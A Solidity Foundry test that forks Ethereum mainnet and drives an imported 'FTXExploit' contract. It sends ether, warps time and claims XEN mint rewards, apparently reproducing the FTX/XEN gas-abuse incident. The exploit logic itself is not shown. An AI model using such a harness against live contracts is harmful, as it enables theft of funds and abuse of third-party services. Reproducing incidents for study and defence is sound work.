// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/FTXExploit.sol";
import "../src/interfaces/IERC20.sol";

//forge test --match-contract "MintControllerTest"  -vvv
contract FTXExploitTest is Test {

    uint256 private constant SECONDS_IN_DAY = 3_600 * 24;

    function setUp() public {
        vm.createSelectFork("eth", 15753661);
    }

    function testFTXWithdraw() public {
        FTXExploit exploit = new FTXExploit();

        //FTX withdraw
        console.log("exploit balance before", address(exploit).balance);
        (bool result, bytes memory data) = address(exploit).call{value: 0.1 ether}("");
        console.log("exploit balance after", address(exploit).balance);
        // change timestamp 
        vm.warp(block.timestamp + SECONDS_IN_DAY + 100);

        exploit.claimMintReward();
        assert(IERC20(0x06450dEe7FD2Fb8E39061434BAbCFC05599a6Fb8).balanceOf(address(this)) > 0);
        console.log("XEN balance", IERC20(0x06450dEe7FD2Fb8E39061434BAbCFC05599a6Fb8).balanceOf(address(this)));
    }
}
